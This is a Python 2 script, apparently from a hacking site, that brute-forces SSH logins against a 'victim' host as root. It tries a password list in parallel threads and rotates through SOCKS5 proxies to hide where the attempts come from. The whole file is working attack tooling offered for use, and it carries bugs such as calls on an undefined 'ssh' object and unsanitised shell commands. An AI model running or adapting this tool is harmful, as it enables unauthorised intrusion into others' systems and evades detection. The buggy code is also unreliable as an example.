#!/usr/bin/env python

#Autor: Adrian Ledesma Bello
#Link: https://www.canalhacker.com

## Usage: ./ssh_bruteforce_proxy.py.py <Victim ip> 22 root pass.txt proxies.txt

import sys
import paramiko
import warnings
import os
import socket
import socks
import urllib2
import threading
import time

def request(proxy, p_proxy, password):

########################## Use the proxy
	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy, p_proxy)
	socket.socket = socks.socksocket
###########################

	warnings.filterwarnings(action='ignore',module='.*paramiko.*')

	hostname = sys.argv[1]
	port = sys.argv[2]
	username = sys.argv[3]

	try:
	    client = paramiko.SSHClient()
	    client.load_system_host_keys()
	    client.set_missing_host_key_policy(paramiko.WarningPolicy)
	    client.connect(hostname, port=port, username=username, password=password, timeout=10)
	    stdin, stdout, stderr = ssh.exec_command('ls -la')
	    print ">>>>>>>>>>>>>>>>  Success: " + password
	    ssh.close()
	    exit()
	except Exception as e:
	   if 'Authentication failed.' in e:
		print "failed login"
		pass
	   else:
		script = "echo " + password+ " >> no_done.txt"
		os.popen(script)
		print "WRONG"

no_done = open("no_done.txt","w+")
pass_file = open(sys.argv[4])
lines_pass = pass_file.readlines()

script = "cat " + sys.argv[4] + "| wc -l"
leng_pass = os.popen(script).read() #### Get number of passwords
script = "cat " + sys.argv[5] + "| wc -l"
leng_proxy = os.popen(script).read() #### Get number of proxies

proxy_file = open(sys.argv[5])
lines_proxy = proxy_file.readlines()
proxy_pos = 0


for pos in range(0,int(leng_pass)):

    if proxy_pos >= int(leng_proxy):
	proxy_pos = 0
    proxy = (lines_proxy[proxy_pos]).rstrip()
    ip_proxy = proxy.split()[0]
    port_proxy = int(proxy.split()[1])
    proxy_pos = proxy_pos + 1
    password = (lines_pass[pos]).rstrip()

    try:
	t1 = threading.Thread(target=request,args=(ip_proxy, port_proxy, password))
	t1.start()
	time.sleep(0.3)
    except:
	no_done.write("no_done.txt")
